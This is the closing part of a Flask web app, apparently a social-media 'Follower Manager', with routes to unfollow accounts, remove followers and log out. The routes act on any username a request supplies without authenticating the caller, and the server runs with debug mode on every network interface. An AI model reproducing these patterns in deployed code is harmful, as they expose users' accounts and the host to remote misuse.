        return jsonify(ok=False, error="Missing params"), 400

    acc = get_account(username)
    try:
        if not acc.get("demo"):
            client_for(username).user_unfollow(pk)
    except EXPIRED:
        _clients.pop(username, None)
        return jsonify(ok=False, error="Your session has ended."), 409
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500

    following = latest(username, "following") or []
    update_latest(username, "following", [u for u in following if u["pk"] != pk])
    return jsonify(ok=True)


@app.route("/api/remove_follower", methods=["POST"])
def api_remove_follower():
    body = request.json or {}
    username, pk = body.get("username"), str(body.get("pk") or "")
    if not username or not pk:
        return jsonify(ok=False, error="Missing params"), 400

    acc = get_account(username)
    try:
        if not acc.get("demo"):
            client_for(username).user_remove_follower(pk)
    except EXPIRED:
        _clients.pop(username, None)
        return jsonify(ok=False, error="Your session has ended."), 409
    except Exception as e:
        return jsonify(ok=False, error=str(e)), 500

    followers = latest(username, "followers") or []
    update_latest(username, "followers", [u for u in followers if u["pk"] != pk])
    return jsonify(ok=True)


@app.route("/logout/<username>")
def logout(username):
    _clients.pop(username, None)
    return redirect(url_for("index"))


@app.errorhandler(404)
def not_found(_e):
    return render_page(
        "404 · Follower Manager", ERROR_BODY, {"code": 404, "message": "That page doesn't exist."}
    ), 404


@app.errorhandler(500)
def server_error(_e):
    return render_page(
        "500 · Follower Manager", ERROR_BODY, {"code": 500, "message": "Something broke on our side."}
    ), 500


if __name__ == "__main__":
    print(f"[start] demo={DEMO_MODE} data_dir={DATA_DIR} python={os.sys.version.split()[0]}", flush=True)
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)), debug=True)
